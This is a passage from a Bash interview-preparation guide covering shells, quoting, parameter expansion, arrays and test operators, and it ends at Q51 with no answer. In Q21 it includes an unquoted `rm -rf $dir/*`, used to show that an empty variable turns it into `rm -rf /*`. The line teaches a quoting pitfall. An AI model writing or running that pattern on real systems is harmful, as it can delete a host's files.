# Shell Scripting — Core Concepts

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> Bash internals, quoting and expansion, arrays, conditionals, functions, exit codes, strict mode, traps, text processing, jq/yq, cron and systemd timers, ShellCheck, portability, security, best practices and rapid-fire commands · 200 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to Shell Scripting](./README.md) · [🏠 Home](../README.md)

## Table of contents
- [Shells, scripts and execution](#shells-scripts-and-execution) — Q1–Q18
- [Variables, quoting and expansions](#variables-quoting-and-expansions) — Q19–Q44
- [Arrays, conditionals and loops](#arrays-conditionals-and-loops) — Q45–Q70
- [Functions, exit codes, strict mode and traps](#functions-exit-codes-strict-mode-and-traps) — Q71–Q98
- [Arguments, I/O, here-docs, process substitution and subshells](#arguments-io-here-docs-process-substitution-and-subshells) — Q99–Q122
- [Text processing: grep, sed, awk, cut, sort, uniq](#text-processing-grep-sed-awk-cut-sort-uniq) — Q123–Q146
- [find, xargs, jq and yq](#find-xargs-jq-and-yq) — Q147–Q162
- [cron and systemd timers](#cron-and-systemd-timers) — Q163–Q176
- [ShellCheck, debugging, testing, portability and security](#shellcheck-debugging-testing-portability-and-security) — Q177–Q192
- [Best practices and rapid-fire commands](#best-practices-and-rapid-fire-commands) — Q193–Q200

---

## Shells, scripts and execution

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. What is a shell, and how is Bash different from sh, dash and zsh? 🟢

<details>
<summary><b>Answer</b></summary>

A shell is a command interpreter: it reads commands, expands them, and starts programs. `sh` is the POSIX standard language, implemented on Debian/Ubuntu by `dash` (small, fast, no arrays or `[[ ]]`) and on RHEL by Bash in POSIX mode. Bash is a superset of POSIX sh with arrays, `[[ ]]`, `(( ))`, process substitution and better interactive features. zsh is the macOS default interactive shell; it is mostly compatible but differs in word splitting and array indexing (arrays start at 1).

In production we write automation in Bash with an explicit `#!/usr/bin/env bash` shebang, and only target POSIX `sh` when the runtime forces it (Alpine, BusyBox, minimal containers).

</details>

### Q2. What does the shebang line do, and why prefer `#!/usr/bin/env bash` over `#!/bin/bash`? 🟢

<details>
<summary><b>Answer</b></summary>

When you run `./script.sh`, the kernel reads the first line; `#!` followed by a path tells it which interpreter to exec, passing the script path as an argument. `#!/bin/bash` hard-codes a location. `#!/usr/bin/env bash` searches `PATH`, which picks up a newer Bash on macOS (Homebrew's Bash 5 instead of Apple's 3.2) or NixOS where `/bin/bash` does not exist.

Trade-off: `env` uses whatever `bash` is first on `PATH`, and on Linux you cannot pass more than one argument reliably (`#!/usr/bin/env bash -e` breaks). Put options in `set` lines instead.

</details>

### Q3. What is the difference between `./script.sh`, `bash script.sh` and `source script.sh`? 🟢

<details>
<summary><b>Answer</b></summary>

- `./script.sh` needs the execute bit, honours the shebang and runs in a **new process**.
- `bash script.sh` runs a new Bash process explicitly; the shebang and execute bit are ignored.
- `source script.sh` (or `. script.sh`) runs the file **inside the current shell**: its variables, `cd`, functions and `exit` affect your session.

```bash
cat > setenv.sh <<'X'
export APP_ENV=staging
cd /srv/app
X
bash setenv.sh;   echo "$APP_ENV"   # empty, still in the old dir
source setenv.sh; echo "$APP_ENV"   # staging, now in /srv/app
```

We `source` libraries and env files; we execute scripts.

</details>

### Q4. What happens when you type a command name? How does Bash decide what to run? 🔴

<details>
<summary><b>Answer</b></summary>

Lookup order: aliases (interactive only by default), shell keywords (`if`, `[[`), functions, builtins (`cd`, `echo`, `read`), then a search of `PATH` directories left to right, cached in a hash table. For an external program Bash forks, sets up redirections in the child, and calls `execve()`.

```bash
type -a echo        # echo is a shell builtin / echo is /usr/bin/echo
command -v kubectl  # path or nothing, exit 1 if missing
hash -r             # forget cached paths after moving a binary
```

`command -v` is the portable way to check whether a tool exists.

</details>

### Q5. Why must `cd`, `export` and `read` be builtins rather than external programs? 🟡

<details>
<summary><b>Answer</b></summary>

An external program runs in a child process, and a child cannot change its parent's state. If `cd` were `/usr/bin/cd`, it would change the child's directory and exit, leaving your shell where it was. The same applies to `export` (shell environment), `read` (sets shell variables), `set`, `trap`, `exit` and `source`. That is also why `sudo cd /root` fails: `sudo` can only exec programs.

</details>

### Q6. What is the difference between a login, interactive and non-interactive shell, and which startup files run? 🟡

<details>
<summary><b>Answer</b></summary>

- **Login shell** (SSH login, `bash -l`): reads `/etc/profile`, then the first of `~/.bash_profile`, `~/.bash_login`, `~/.profile`.
- **Interactive non-login** (new terminal tab): reads `~/.bashrc`.
- **Non-interactive** (scripts, cron, `ssh host cmd` mostly): reads nothing, except the file named in `$BASH_ENV`.

This is why a script works in your terminal but fails in cron: the `PATH`, aliases and variables from `.bashrc` are not there. Scripts must set everything they need themselves.

</details>

### Q7. What does `exec` do in a script? Give two uses. 🔴

<details>
<summary><b>Answer</b></summary>

`exec cmd` replaces the current shell process with `cmd`: same PID, no return. `exec` with only redirections changes the shell's own file descriptors.

```bash
# 1. Container entrypoint: the app becomes PID 1 and receives SIGTERM directly
exec gunicorn app:app --bind 0.0.0.0:8000

# 2. Send all further output of the script to a log file and the terminal
exec > >(tee -a /var/log/deploy.log) 2>&1
```

Without `exec` in an entrypoint, the shell stays PID 1 and does not forward signals, so `docker stop` waits 10 seconds and kills it.

</details>

### Q8. Why do we wrap script logic in a `main` function and call `main "$@"` at the end? 🔴

<details>
<summary><b>Answer</b></summary>

Three reasons:
1. Bash reads and executes a script incrementally. If someone edits or replaces the file while it runs, the running shell can read garbage from the new offset. With everything in functions, the whole file is parsed before `main` executes.
2. Functions can be defined in any order and `local` variables keep state contained.
3. The file can be sourced by tests without running: `[[ "${BASH_SOURCE[0]}" == "$0" ]] && main "$@"`.

</details>

### Q9. What is the difference between a shell variable and an environment variable? 🟢

<details>
<summary><b>Answer</b></summary>

A shell variable exists only in the current shell. An environment variable is exported and copied into the environment of every child process.

```bash
REGION=ap-south-1;  bash -c 'echo "[$REGION]"'   # []
export REGION;      bash -c 'echo "[$REGION]"'   # [ap-south-1]
REGION=us-east-1 aws s3 ls                        # set only for this one command
env | grep REGION                                 # list exported variables
```

Children can never change the parent's environment, which is why `source` exists.

</details>

### Q10. What do `$0`, `$1`, `$#`, `$@`, `$*`, `$?`, `$$`, `$!` and `$-` contain? 🟢

<details>
<summary><b>Answer</b></summary>

| Variable | Meaning |
|---|---|
| `$0` | Script name as invoked |
| `$1`..`$9`, `${10}` | Positional arguments (braces needed from 10) |
| `$#` | Number of arguments |
| `"$@"` | All arguments, each as a separate word |
| `"$*"` | All arguments joined into one word with the first char of `IFS` |
| `$?` | Exit status of the last command |
| `$$` | PID of the current shell (the parent, even inside a subshell) |
| `$!` | PID of the last background job |
| `$-` | Current option flags, e.g. `hB` or `ehuB` |

`$BASHPID` gives the real PID inside a subshell.

</details>

### Q11. What are the main categories of shell expansion, in the order Bash performs them? 🔴

<details>
<summary><b>Answer</b></summary>

1. Brace expansion: `{a,b}`, `{1..10}`
2. Tilde expansion: `~`, `~user`
3. Parameter and variable expansion, arithmetic expansion `$(( ))`, command substitution `$( )` and process substitution `<( )`, left to right
4. Word splitting on `IFS` (unquoted results only)
5. Pathname expansion (globbing) of unquoted `*`, `?`, `[...]`
6. Quote removal

Consequence: `x={1..3}; echo $x` prints `{1..3}`, because brace expansion happened before the variable was expanded. And `"$var"` skips steps 4 and 5, which is why quoting prevents most bugs.

</details>

### Q12. Why is it a bad idea to name a script `test` or a function `ls`? 🟢

<details>
<summary><b>Answer</b></summary>

`test` is a shell builtin (`[` is the same command), so typing `test` runs the builtin and your script silently does nothing. Functions shadow commands too: a function named `ls` or `cd` in a sourced library changes behaviour for every later caller. Use unique, prefixed names (`opskit_backup`, `deploy_rollout`), and call the real command with `command ls` when you deliberately wrap one.

</details>

### Q13. How does Bash handle a script with Windows line endings (CRLF)? 🟡

<details>
<summary><b>Answer</b></summary>

Every line ends in `\r`, which Bash treats as part of the last word. The shebang becomes `bash\r`, so `./s.sh` fails with `bad interpreter: No such file or directory`, and `bash s.sh` fails with `$'\r': command not found` or `syntax error near unexpected token $'\r'`.

```bash
file deploy.sh            # "with CRLF line terminators"
sed -i 's/\r$//' deploy.sh   # or: dos2unix deploy.sh
```

Prevent it with `*.sh text eol=lf` in `.gitattributes`.

</details>

### Q14. What is the difference between `;`, `&&`, `||` and `&` between commands? 🟢

<details>
<summary><b>Answer</b></summary>

- `a ; b` runs `b` after `a`, regardless of result.
- `a && b` runs `b` only if `a` succeeded (exit 0).
- `a || b` runs `b` only if `a` failed.
- `a & b` runs `a` in the background and `b` immediately.

```bash
mkdir -p /srv/app && cd /srv/app || exit 1
systemctl is-active --quiet nginx || systemctl restart nginx
```

`a && b || c` is not if/else: `c` also runs when `b` fails.

</details>

### Q15. What is the difference between `$(command)` and backticks? 🟢

<details>
<summary><b>Answer</b></summary>

Both are command substitution: run the command and substitute its stdout, with trailing newlines removed. `$( )` nests cleanly and handles backslashes predictably; backticks need escaping to nest and are hard to read.

```bash
release=$(basename "$(readlink -f /srv/app/current)")
```

Always use `$( )` and quote it: `"$(cmd)"`.

</details>

### Q16. How do you run a command in the background, wait for it and collect its exit code? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
pids=()
for host in web1 web2 web3; do
  ssh -o BatchMode=yes "$host" 'sudo systemctl restart app' &
  pids+=("$!")
done
rc=0
for pid in "${pids[@]}"; do
  wait "$pid" || rc=1          # wait PID returns that job's exit status
done
exit "$rc"
```

Plain `wait` with no arguments waits for all jobs but always returns 0, so failures are lost. Bash 5.1+ also has `wait -n -p var` to handle whichever job finishes first.

</details>

### Q17. What are `nohup`, `disown` and `setsid` used for? 🟡

<details>
<summary><b>Answer</b></summary>

When a terminal closes, the shell sends `SIGHUP` to its jobs. `nohup cmd &` makes `cmd` ignore `SIGHUP` and redirects output to `nohup.out`. `disown %1` removes a running job from the shell's job table so it is not sent `SIGHUP`. `setsid cmd` starts it in a new session with no controlling terminal.

For anything that must keep running, we do not rely on these: we use a systemd unit (`systemd-run --unit=reindex ./reindex.sh` for one-offs) or `tmux`, so the job is supervised and logged.

</details>

### Q18. When should a task not be written in Bash? 🟡

<details>
<summary><b>Answer</b></summary>

Bash is ideal for gluing commands, file operations and short automation. Move to Python or Go when you need: real data structures (nested maps, objects), JSON/HTTP-heavy logic beyond a few `jq`/`curl` calls, error handling across many steps with retries and state, concurrency beyond a few background jobs, unit tests of business logic, or more than roughly 200 to 300 lines. A good interview line: "If I am fighting the language with `eval` or nested arrays, it is time to switch."

</details>

---

## Variables, quoting and expansions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q19. What are the rules for assigning variables in Bash? 🟢

<details>
<summary><b>Answer</b></summary>

No spaces around `=`. `name=value` assigns; `name = value` runs a command named `name` with arguments `=` and `value`. Names are letters, digits and underscores, not starting with a digit. The right side does not undergo word splitting or globbing, but quoting it is still a good habit.

```bash
APP_DIR=/srv/app
release="$(date +%Y%m%d%H%M%S)"
msg="deploy of ${release} started"
```

Use lowercase for script-local variables and UPPERCASE for exported/environment ones, so you never clobber `PATH`, `HOME` or `USER` by accident.

</details>

### Q20. What is the difference between single quotes, double quotes and `$'...'`? 🟢

<details>
<summary><b>Answer</b></summary>

- Single quotes: everything literal, no expansion, cannot contain a single quote.
- Double quotes: one word, but `$var`, `$(cmd)`, `$((expr))`, backticks, and backslash escapes of `$`, `"`, `\` and the backtick still work.
- `$'...'` (ANSI-C quoting): interprets escapes such as `\n`, `\t`, `\x1b`, `\'`.

```bash
name=prod
echo 'env=$name'        # env=$name
echo "env=$name"        # env=prod
IFS=$'\n'               # a real newline character
echo $'it\'s ready'     # it's ready
```

</details>

### Q21. Why should you almost always quote variable expansions? Show what goes wrong. 🟢

<details>
<summary><b>Answer</b></summary>

Unquoted expansions undergo word splitting on `IFS` and pathname expansion.

```bash
file="monthly report.csv"
rm $file        # rm: cannot remove 'monthly': No such file or directory
rm "$file"      # correct

pattern="*"
echo $pattern   # lists every file in the directory
dir=""
rm -rf $dir/*   # becomes rm -rf /*
```

Quote `"$var"`, `"$(cmd)"` and `"${arr[@]}"`. The exceptions are deliberate: inside `[[ ]]`, on the right side of an assignment, and when you intentionally want splitting (documented with a comment).

</details>

### Q22. Explain the difference between `"$@"`, `"$*"`, `$@` and `$*`. 🟡

<details>
<summary><b>Answer</b></summary>

```bash
show() { printf '[%s]\n' "$@"; }
set -- "a b" c
show "$@"   # [a b] [c]       each argument preserved
show "$*"   # [a b c]         one word joined by first char of IFS
show $@     # [a] [b] [c]     re-split
show $*     # [a] [b] [c]     re-split
```

Use `"$@"` to forward arguments (`exec "$@"`, wrapper scripts). Use `"$*"` only when you want one string, e.g. a log message: `log "args: $*"`.

</details>

### Q23. What do `${var:-default}`, `${var:=default}`, `${var:+alt}` and `${var:?msg}` do? 🟡

<details>
<summary><b>Answer</b></summary>

| Form | If var is unset or empty |
|---|---|
| `${var:-x}` | expands to `x` (var unchanged) |
| `${var:=x}` | assigns `x` to var and expands to it |
| `${var:+x}` | expands to `x` only if var is **set and non-empty**, else nothing |
| `${var:?msg}` | prints `msg` to stderr and exits a non-interactive shell |

Without the colon (`${var-x}`), only "unset" triggers, not "empty".

```bash
: "${ENVIRONMENT:?set ENVIRONMENT to dev, staging or prod}"
: "${RETRIES:=3}"
curl ${VERBOSE:+-v} -fsS "$url"   # adds -v only when VERBOSE is set
```

</details>

### Q24. How do you strip prefixes and suffixes with parameter expansion? 🟡

<details>
<summary><b>Answer</b></summary>

`#` removes from the front, `%` from the back; single = shortest match, double = longest.

```bash
path=/var/backups/web1-20261109.tar.gz
echo "${path##*/}"      # web1-20261109.tar.gz   (basename)
echo "${path%/*}"       # /var/backups          (dirname)
f=${path##*/}
echo "${f%%.*}"         # web1-20261109         (strip all extensions)
echo "${f%.gz}"         # web1-20261109.tar
echo "${f#*-}"          # 20261109.tar.gz
```

These run inside the shell with no fork, so they are much faster than calling `basename` in a loop over 10,000 files.

</details>

### Q25. How do you do search-and-replace, substrings, length and case conversion without external tools? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
s="api-prod-api"
echo "${s/api/svc}"     # svc-prod-api   first match
echo "${s//api/svc}"    # svc-prod-svc   all matches
echo "${s/#api/svc}"    # anchored at start
echo "${s/%api/svc}"    # anchored at end
echo "${#s}"            # 12             length
echo "${s:4:4}"         # prod           offset 4, length 4
echo "${s: -3}"         # api            last 3 (space before -)
echo "${s^^}" "${s,,}"  # uppercase / lowercase (Bash 4+)
```

</details>

### Q26. What is indirect expansion (`${!var}`) and when is it useful? 🔴

<details>
<summary><b>Answer</b></summary>

`${!name}` expands the variable whose name is stored in `name`.

```bash
DB_HOST_PROD=db.prod.internal
env=PROD
key="DB_HOST_${env}"
echo "${!key}"          # db.prod.internal
echo "${!DB_HOST_*}"    # names of all variables starting with DB_HOST_
```

It is the safe alternative to `eval "echo \$$key"`. For anything more than a lookup, prefer an associative array (`declare -A db_host=([prod]=...)`) or a nameref (`declare -n ref=$key`).

</details>

### Q27. What does `declare` do? Name the useful flags. 🟡

<details>
<summary><b>Answer</b></summary>

`declare` (same as `typeset`) sets attributes on variables:

- `-r` read-only, `-x` export, `-i` integer (assignments are evaluated arithmetically)
- `-a` indexed array, `-A` associative array
- `-l` / `-u` force lower/upper case on assignment
- `-n` nameref (reference to another variable)
- `-g` make global from inside a function
- `-p NAME` print the definition, `-f NAME` print a function

```bash
declare -r CONFIG=/etc/opskit/opskit.conf
declare -A ports=([http]=80 [https]=443)
declare -p ports
```

Inside a function, `declare` behaves like `local` unless you add `-g`.

</details>

### Q28. What is `IFS` and how does it affect your script? 🟡

<details>
<summary><b>Answer</b></summary>

`IFS` (Internal Field Separator, default space, tab, newline) controls how unquoted expansions are split into words and how `read` splits a line into fields. Its first character also joins `"$*"`.

```bash
IFS=: read -r user _ uid gid _ home shell <<<"deploy:x:1001:1001::/home/deploy:/bin/bash"
echo "$user $uid $shell"

IFS=, ; set -- $csv_line ; unset IFS   # split once, then restore
```

Change `IFS` locally (`IFS=, read ...`) rather than globally; a global change breaks unrelated code later in the script.

</details>

### Q29. Why do we write `while IFS= read -r line`? What does each part do? 🟡

<details>
<summary><b>Answer</b></summary>

- `IFS=` for this `read` only, so leading and trailing whitespace is kept (important for YAML, Makefiles and indented logs).
- `-r` treats backslashes literally instead of as escape characters (Windows paths, regexes).
- `read` returns non-zero at end of file, which ends the loop.

```bash
while IFS= read -r line || [[ -n "$line" ]]; do
  printf '%s\n' "$line"
done < /etc/hosts
```

The `|| [[ -n "$line" ]]` handles a final line with no trailing newline, which `read` would otherwise drop.

</details>

### Q30. What is the difference between `echo` and `printf`, and why do production scripts prefer `printf`? 🟡

<details>
<summary><b>Answer</b></summary>

`echo` behaviour varies: some shells interpret `\n` by default, `-e`/`-n` are not portable, and a value like `-n` or `-e` is swallowed as an option. `printf` is consistent everywhere and supports formatting.

```bash
printf '%s\n' "$user_input"           # always prints the value literally
printf '%-20s %5d%%\n' "/var" 93       # aligned columns
printf -v stamp '%(%Y-%m-%dT%H:%M:%S)T' -1   # timestamp, no fork (Bash 4.2+)
```

Rule: `echo` for fixed strings, `printf '%s\n'` for anything containing variables.

</details>

### Q31. How does arithmetic work in Bash? 🟢

<details>
<summary><b>Answer</b></summary>

Bash does integer arithmetic only, in `$(( ))` (expands to the result) and `(( ))` (a command whose exit status is 0 if the result is non-zero).

```bash
used=$(( total - free ))
pct=$(( used * 100 / total ))       # integer division, truncates
(( pct >= 90 )) && echo critical
(( retries++ ))                     # careful under set -e when retries=0
echo $(( 2 ** 10 )) $(( 17 % 5 ))   # 1024 2
```

Variables inside `(( ))` need no `$`. For decimals use `awk` or `bc`: `awk "BEGIN {printf \"%.2f\", $a/$b}"`.

</details>

### Q32. Why does `$(( 08 + 1 ))` fail, and how do you fix it? 🔴

<details>
<summary><b>Answer</b></summary>

A leading zero means octal in shell arithmetic, and 8 and 9 are not octal digits: `bash: 08: value too great for base (error token is "08")`. This bites when doing math on `date +%m`, `date +%H` or zero-padded IDs.

```bash
month=$(date +%m)          # "08"
next=$(( 10#$month + 1 ))  # force base 10 -> 9
hour=$(date +%-H)          # GNU date: no padding
```

</details>

### Q33. What does `readonly` do and when do you use it? 🟢

<details>
<summary><b>Answer</b></summary>

It makes a variable (or function with `readonly -f`) immutable for the rest of the shell's life; assigning again fails with `bash: X: readonly variable` and, under `set -e`, exits. Use it for constants that must never change mid-script:

```bash
readonly SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
readonly BACKUP_ROOT=/var/backups/opskit
```

Do not mark variables readonly in a library that might be sourced twice; the second source fails. Guard with `[[ -v VAR ]] || readonly VAR=...` or a load guard.

</details>

### Q34. What is the difference between `unset var`, `var=` and `var=""`? How do you test which state a variable is in? 🟡

<details>
<summary><b>Answer</b></summary>

`unset var` removes it. `var=` and `var=""` set it to the empty string; it exists but is empty.

```bash
[[ -v var ]]          # true if set (even empty), Bash 4.2+
[[ -n "${var-}" ]]    # true if set and non-empty, safe under set -u
[[ -z "${var+x}" ]]   # true if unset (portable idiom)
```

This matters for config: "unset" usually means "use the default", "empty" may mean "explicitly disabled".

</details>

### Q35. How does globbing work, and what do `nullglob`, `failglob`, `dotglob` and `globstar` change? 🟡

<details>
<summary><b>Answer</b></summary>

Unquoted `*`, `?` and `[...]` are matched against filenames. If nothing matches, Bash by default leaves the pattern **literally**, so `for f in *.log` with no logs runs once with `f='*.log'`.

```bash
shopt -s nullglob   # no match -> expands to nothing
shopt -s failglob   # no match -> error
shopt -s dotglob    # * also matches .hidden files
shopt -s globstar   # ** matches recursively: for f in /etc/**/*.conf
shopt -s extglob    # !(pattern), +(a|b), @(x|y)
rm -- !(*.keep)     # with extglob: remove everything except *.keep
```

Globs are not regexes: `*` means "any characters", not "repeat the previous one".

</details>

### Q36. What is brace expansion and how is it different from globbing? 🟢

<details>
<summary><b>Answer</b></summary>

Brace expansion generates strings whether or not files exist; globbing matches existing files.

```bash
mkdir -p /srv/app/{releases,shared/{logs,config}}
cp nginx.conf{,.bak}           # cp nginx.conf nginx.conf.bak
echo web{1..3}.prod            # web1.prod web2.prod web3.prod
echo {01..10..3}               # 01 04 07 10
```

Brace expansion happens first and does not work with variables: `{1..$n}` stays literal. Use `seq 1 "$n"` or a C-style `for ((i=1; i<=n; i++))` loop.

</details>

### Q37. What is tilde expansion, and why does `"~/backup"` not work? 🟡

<details>
<summary><b>Answer</b></summary>

An unquoted `~` at the start of a word expands to `$HOME` (`~user` to that user's home, `~+` to `$PWD`). Inside quotes it is literal, so `cd "~/backup"` looks for a directory named `~`. Use `"$HOME/backup"` in scripts, which is explicit and survives quoting. Also note that under `sudo`, `HOME` may still be your user's home or root's depending on `sudoers` (`env_reset`, `always_set_home`).

</details>

### Q38. How do you get the directory a script lives in, reliably? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
# Follow symlinks too (GNU readlink, e.g. /usr/local/bin/tool -> /opt/tool/bin/tool):
SCRIPT_DIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE[0]}")")
```

`${BASH_SOURCE[0]}` is correct even when the file is sourced, unlike `$0`. Never rely on the current directory: cron and systemd start in `/` or `$HOME`. On macOS, use `greadlink` from coreutils or `realpath`.

</details>

### Q39. What is a nameref (`declare -n`) and what problem does it solve? 🔴

<details>
<summary><b>Answer</b></summary>

A nameref is an alias to another variable, which lets a function write into a variable (or array) whose name the caller passes, without `eval`.

```bash
split_csv() {            # split_csv OUT_ARRAY "a,b,c"
  local -n _out=$1
  IFS=, read -r -a _out <<<"$2"
}
split_csv hosts "web1,web2,web3"
echo "${#hosts[@]} ${hosts[1]}"   # 3 web2
```

Prefix nameref locals with `_` so they do not collide with the caller's variable name (`local -n hosts=$1` with a caller variable `hosts` is a circular reference). Requires Bash 4.3+.

</details>

### Q40. How do you safely read a secret or password in a script? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
read -rsp 'DB password: ' DB_PASS; echo
```

`-s` disables echo, `-p` prints a prompt. In automation there is no terminal, so read from a file with tight permissions or a secrets manager:

```bash
DB_PASS=$(< /run/secrets/db_password)                         # Docker/K8s secret file
DB_PASS=$(aws secretsmanager get-secret-value --secret-id prod/db \
  --query SecretString --output text)
```

Never pass secrets as command-line arguments (visible in `ps` and `/proc/PID/cmdline`), never `echo` them, and turn off `set -x` around them.

</details>

### Q41. What does `$RANDOM` give you, and is it suitable for passwords or tokens? 🟡

<details>
<summary><b>Answer</b></summary>

`$RANDOM` returns a pseudo-random integer from 0 to 32767. It is fine for jitter (`sleep $((RANDOM % 30))` to spread cron load) but not for secrets: the range is tiny and it is predictable. For secrets use the kernel CSPRNG:

```bash
openssl rand -base64 32
head -c 32 /dev/urandom | base64
echo "$SRANDOM"   # Bash 5.1+: 32-bit value from the system CSPRNG
```

</details>

### Q42. What do `SECONDS`, `LINENO`, `FUNCNAME`, `BASH_SOURCE` and `PIPESTATUS` provide? 🟡

<details>
<summary><b>Answer</b></summary>

- `SECONDS`: seconds since the shell started; reset with `SECONDS=0` to time a step.
- `LINENO`: current line number, ideal in error messages.
- `FUNCNAME`: array of the current call stack of function names.
- `BASH_SOURCE`: array of source files matching `FUNCNAME`.
- `PIPESTATUS`: array of exit codes of each command in the last pipeline.

```bash
SECONDS=0; rsync -a src/ dst/; echo "rsync took ${SECONDS}s"
die() { echo "ERROR ${BASH_SOURCE[1]}:${BASH_LINENO[0]} in ${FUNCNAME[1]}: $*" >&2; exit 1; }
```

</details>

### Q43. What is the difference between `$( < file )` and `$(cat file)`? 🟢

<details>
<summary><b>Answer</b></summary>

Both read the whole file into a string with trailing newlines stripped. `$(< file)` is a Bash shortcut that reads the file without forking `cat`, so it is faster in loops. If the file is missing, both print an error; `$(< file)` fails with `bash: file: No such file or directory`.

```bash
token=$(< /run/secrets/api_token)
```

</details>

### Q44. Why does command substitution strip trailing newlines, and how do you keep them? 🔴

<details>
<summary><b>Answer</b></summary>

POSIX defines command substitution to remove all trailing newlines, which is usually what you want (`x=$(hostname)`). When you need exact content (a file that must end in a newline, a PEM block, a value that may end in blank lines), add a sentinel and remove it:

```bash
content=$(cat cert.pem; printf x)
content=${content%x}
```

Also note that command substitution cannot hold NUL bytes; Bash drops them with `warning: command substitution: ignored null byte in input`. Binary data belongs in files, not variables.

</details>

---

## Arrays, conditionals and loops

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q45. How do you declare, populate and iterate an indexed array? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
hosts=(web1 web2 "web 3")
hosts+=(web4)                     # append
echo "${hosts[0]}"                # first element
echo "${#hosts[@]}"               # number of elements: 4
for h in "${hosts[@]}"; do        # quoted: "web 3" stays one element
  echo "deploying to $h"
done
echo "${!hosts[@]}"               # indices: 0 1 2 3
echo "${hosts[@]:1:2}"            # slice: web2 web 3
unset 'hosts[1]'                  # remove element (indices are now sparse)
```

Always iterate with `"${arr[@]}"`. `${arr}` alone is just element 0, a common bug.

</details>

### Q46. What is the difference between `"${arr[@]}"` and `"${arr[*]}"`? 🟡

<details>
<summary><b>Answer</b></summary>

`"${arr[@]}"` expands to one word per element, preserving spaces. `"${arr[*]}"` joins all elements into a single word separated by the first character of `IFS`.

```bash
files=("a b.txt" c.txt)
ls -l "${files[@]}"                  # two arguments
(IFS=,; echo "${files[*]}")          # a b.txt,c.txt  (join in a subshell)
```

Use `[@]` to pass elements to commands and `[*]` to build a display string.

</details>

### Q47. How do associative arrays work and what are they good for in DevOps scripts? 🟡

<details>
<summary><b>Answer</b></summary>

Associative arrays (Bash 4+) map string keys to values; declare them with `declare -A` first.

```bash
declare -A replicas=([api]=3 [worker]=2 [web]=4)
replicas[cron]=1
for svc in "${!replicas[@]}"; do
  kubectl scale deploy "$svc" --replicas="${replicas[$svc]}"
done
[[ -v replicas[api] ]] && echo "api configured"

# Counting: requests per status code
declare -A count
while read -r code; do (( count[$code]++ )) || true; done < <(awk '{print $9}' access.log)
```

Key order is not guaranteed; pipe through `sort` if order matters. macOS ships Bash 3.2, which fails with `declare: -A: invalid option`.

</details>

### Q48. How do you read a command's output into an array correctly? 🟡

<details>
<summary><b>Answer</b></summary>

Use `mapfile` (alias `readarray`), which splits on newlines only:

```bash
mapfile -t pods < <(kubectl get pods -o name)
echo "found ${#pods[@]} pods"

# NUL-delimited for arbitrary filenames (Bash 4.4+)
mapfile -d '' -t files < <(find /var/log/app -name '*.log' -print0)
```

Avoid `arr=( $(cmd) )`: it splits on spaces and expands globs, so a line `* 2 pods` becomes a directory listing. ShellCheck flags this as SC2207.

</details>

### Q49. What is the difference between `[ ]`, `[[ ]]` and `(( ))`? 🟢

<details>
<summary><b>Answer</b></summary>

- `[ ]` is the `test` command (POSIX). Arguments undergo word splitting and globbing, so you must quote; use `-a`/`-o` sparingly (deprecated) and `=` for string equality.
- `[[ ]]` is a Bash keyword: no word splitting or globbing on variables, supports `&&`, `||`, `<`, `>` (string compare), pattern matching with `==` and regex with `=~`.
- `(( ))` is arithmetic: `(( a > b ))`, `(( n % 2 == 0 ))`.

```bash
[ -n "$var" ] && [ "$a" = "$b" ]     # POSIX sh
[[ $file == *.tar.gz && -s $file ]]   # Bash
(( disk_pct >= 90 ))                  # numbers
```

In Bash scripts use `[[ ]]` for strings and files, `(( ))` for numbers.

</details>

### Q50. Why does `[ $var = "prod" ]` fail when `var` is empty or contains spaces? 🟡

<details>
<summary><b>Answer</b></summary>

`[` is a command, so the unquoted variable is split before `[` sees it. Empty `var` gives `[ = prod ]` → `bash: [: =: unary operator expected`. `var="a b"` gives `[ a b = prod ]` → `bash: [: too many arguments`.

```bash
[ "$var" = "prod" ]     # fixed
[[ $var == prod ]]      # Bash: no splitting inside [[ ]]
```

</details>

### Q51. List the most-used file test operators. 🟢

